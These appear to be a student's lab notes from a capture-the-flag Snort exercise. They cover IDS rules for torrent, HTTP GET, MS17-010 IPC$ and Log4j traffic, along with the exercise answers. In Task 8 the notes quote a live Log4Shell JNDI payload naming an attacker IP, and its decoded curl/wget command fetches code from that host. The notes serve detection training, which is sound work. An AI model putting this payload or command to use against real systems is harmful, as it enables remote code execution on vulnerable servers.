---
created: 2025-11-04}T00:33
tags:
  - CyberChallenges
  - "#Snort"
links:
  - "[[Linux]]"
---
# Notes
## Task 5
- We read the file with the tcpdump -r
- after getting the values, we see two get parameters, but we could only use the following command to detect:
  ```bash
  Firstly, we try to detect the number of packages:
  sudo snort -r torrent.pcap
  
  add the following rule to the local.rules:
  alert tcp any any <> any any (msg:"Torrent MetaFile Detected"; content:"torrent"; sid:100001; rev:1;)
  
  After that, we could just run the rules:
  sudo snort -c local.rules -A full -l . -r torrent.pcap
  
  after this, it will generate a file with the snort.log, just read it to answer the 
   - What is the number of detected packets? -  2
   - What is the name of the torrent application? -  bittorrent
   - What is the MIME (Multipurpose Internet Mail Extensions) type of the torrent metafile? - application/x-bittorrent
   - What is the hostname of the torrent metafile? - tracker2.torrentbox.com
  ```

```bash
Torrent info:
ubuntu@ip-10-10-73-190:~/Desktop/Exercise-Files/TASK-5 (TorrentMetafile)$ sudo cat snort.log.1762217165 
�ò�����B�0����E�UJ@�A�z�E,��
�饐�
    �rP"8�GET /announce?info_hash=%01d%FE%7E%F1%10%5CWvAp%ED%F6%03%C49%D6B%14%F1&peer_id=%B8js%7F%E8%0C%AFh%02Y%967%24e%27V%EEM%16%5B&port=41730&uploaded=0&downloaded=0&left=3767869&compact=1&ip=127.0.0.1&event=started HTTP/1.1
Accept: application/x-bittorrent
Accept-Encoding: gzip
User-Agent: RAZA 2.1.0.0
Host: tracker2.torrentbox.com:2710
Connection: Keep-Alive

�BX����E�X�@���z�E,��@
��G��ߎP"8�GET /announce?info_hash=%01d%FE%7E%F1%10%5CWvAp%ED%F6%03%C49%D6B%14%F1&peer_id=%B8js%7F%E8%0C%AFh%02Y%967%24e%27V%EEM%16%5B&port=41730&uploaded=0&downloaded=0&left=3767869&compact=1&ip=127.0.0.1 HTTP/1.1
Accept: application/x-bittorrent
Accept-Encoding: gzip
User-Agent: RAZA 2.1.0.0
Host: tracker2.torrentbox.com:2710
Connection: Keep-Alive
```
## Task 6
```bash
Fix the logical error in local-6.rules file and make it work smoothly to create alerts. -
For this case we need to correct the spaces and then add the following rule:
alert tcp any any <> any 80 (msg:"GET Request Found"; content:"|67 65 74|";nocase; sid:100001; rev:1;)

Fix the logical error in local-7.rules file and make it work smoothly to create alerts:
for the file 7, we need to solve certain things (add the message and the following conditions):
alert tcp any any <> any 80 (msg:"GET HTML File found"; content:"|2E 68 74 6D 6C|";nocase; sid:100001; rev:1;)
```
## Task7
- In this task we could first of course do a normal run:
- 1- What is the number of detected packets?
```bash
sudo snort -c local.rules -r ms-17-010.pcap -A console - Just see the packages filtered
```
- 2- Use local-1.rules empty file to write a new rule to detect payloads containing the "\IPC$" keyword.
- What is the number of detected packets?
```bash
add the rule to the local-1 file:
	alert tcp any any -> any 445 (msg: "Exploit Detected!"; flow: to_server, established; content: "IPC$";sid: 20244225; rev:3;)
Then just run the following rules:
	sudo snort -c local-1.rules -r ms-17-010.pcap -A console -K ASCII -l . - to download the information in the format of a log file.
Then just do the following:
	sudo cat {{name_of_the_file}}
```
## Task8
1- What is the number of detected packets?  - 
```bash
Just run the following:
	sudo snort -c local.rules -r log4j.pcap
```
2- How many rules were triggered?.
```bash
do the following line:
sudo snort -c local.rules -r log4j.pcap -l .
sudo cat {{file}}
	check the alert and detect the news one.
```
3- What are the first six digits of the triggered rule sids?
```bash
just search for the ssid done in the last question
```
4- Use local-1.rules empty file to write a new rule to detect packet payloads **between 770 and 855 bytes**.
What is the number of detected packets?
```bash
alert tcp any any -> any any (msg:"Detect Packages between"; dsize:770<>855; sid:21003726; rev:1;)
# the key here is with the dsize
```
5- What is the name of the used encoding algorithm? Base64...
```bash
just:
sudo cat {{name_of_the_file}} or sudo snort -r {{package_file}}
Detect the encoding showed during the path:
^v�c���GET /?x=${jndi:ldap://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=
```
6- What is the IP ID of the corresponding packet?
```bash
for this we could just find the information with:
sudo snort -r {{package_file}} -X
```
7-Decode the encoded command. What is the attacker's command?
```bash
decode the string in the command:
curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80
```
# References
https://www.avast.com/pt-br/c-eternalblue - this is the number of the vuln  MS17-010
https://docs.snort.org/rules/options/payload/dsize - dsize comparator
https://nvd.nist.gov/vuln/detail/cve-2021-44228 - log4j score